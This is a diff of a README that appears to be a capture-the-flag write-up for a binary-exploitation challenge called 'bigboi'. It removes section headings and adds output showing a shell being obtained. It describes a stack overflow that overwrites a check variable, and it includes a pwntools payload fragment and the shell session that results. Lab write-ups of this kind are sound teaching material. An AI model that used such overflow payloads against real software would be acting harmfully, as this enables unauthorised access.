@@ -1,7 +1,5 @@
 # bigboi
 
-## Enumeration
-
 **24** bytes is being read into an **8** byte buffer, allowing a clobber of the **target** variable to pass the check and execute `/bin/bash`. 
 
 ```c
@@ -38,8 +36,6 @@ undefined8 main(void)
 }
 ```
 
-## Manual Exploitation
-
 **20** Bytes of padding allows us to change `0xdeadbeef` to `0xcaf3baee`. 
 
 ```bash
@@ -69,9 +65,7 @@ pwndbg> r < payload
 ...
 ```
 
-## Automating Exploitation
-
-Python exploit script
+Automate that with a Python script
 
 ```python
 #!/usr/bin/python3
@@ -87,4 +81,14 @@ payload = b"A"*20 + p32(0xcaf3baee)
 
 p.sendline(payload)
 p.interactive()
+```
+
+To get a shell
+
+```shell
+python3 exploit.py
+
+Are you a big boiiiii??
+$ ls
+boi  exploit.py  payload  README.md
 ```
